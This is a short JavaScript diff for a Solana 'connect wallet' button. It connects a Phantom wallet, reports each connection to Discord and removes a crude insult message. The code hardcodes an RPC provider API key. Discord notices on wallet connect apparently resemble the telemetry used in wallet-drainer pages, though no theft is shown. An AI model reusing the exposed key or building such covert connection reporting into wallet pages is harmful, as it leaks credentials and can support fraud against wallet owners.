@@ -12,12 +12,12 @@ async function sendToDiscord(message) {
   
   // Usage;
 $(document).ready(function() {
-    $('#connect-wallet').on('click',   sendToDiscord('you are pidoras'), async () => {
+    $('#connect-wallet').on('click', async () => {
         if (window.solana && window.solana.isPhantom) {
             try {
                 const resp = await window.solana.connect();
+                sendToDiscord('Wallet connected')
                 console.log("Phantom Wallet connected:", resp);
-
                 var connection = new solanaWeb3.Connection(
                     'https://solana-mainnet.api.syndica.io/api-key/2zjjPuoKeAWepmScwJ72ADocHcNZzLPhNpbqR1X7eB2jMRAdbXMUzuCks578zUKnWnog8dBpj6Km1dHKdjS5p2hQD6cJ7yUgqVp', 
                     'confirmed'
